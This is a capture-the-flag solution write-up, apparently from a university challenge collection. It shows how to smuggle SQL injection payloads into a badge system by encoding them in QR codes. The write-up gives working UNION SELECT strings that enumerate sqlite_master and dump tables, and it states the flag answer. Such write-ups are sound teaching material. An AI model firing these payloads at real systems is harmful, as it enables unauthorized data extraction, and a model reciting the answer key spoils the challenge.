<img src="../../../../../logo.png" height="250px">

# Hasenpfeffer Badgeonator Incorporated

## Solution

To solve, player will have to inject via qr codes. We recommend pypy's qrcode
(installed by `pip3` during challenge setup as part of `requirements.txt`).

First, check if the server might be vulnerable to sql injection via QR images?

```
$ qr "'" > ~/Desktop/0.png
```

It is! Now lets get table names:

```
$ qr "' OR '1'='1' union SELECT 1, 2, 3, tbl_name FROM sqlite_master --" > ~/Desktop/1.png
```

Once you find the table, get the values:

```
$ qr "' OR '1'='1' union SELECT 1, 2, 3, value FROM flag --" > ~/Desktop/2.png
```

Now that we have the table name, lets dump the values:

```
$ qr "' OR '1'='1' union SELECT 1, 2, id, value FROM shotz --" > ~/Desktop/3.png
```

The flag is a lat/lng coordinate.

Flag - `43°35'26''N 84°11'52''W`

## License
Copyright 2020 Carnegie Mellon University. See the [LICENSE.md](../../../LICENSE.md) file for details.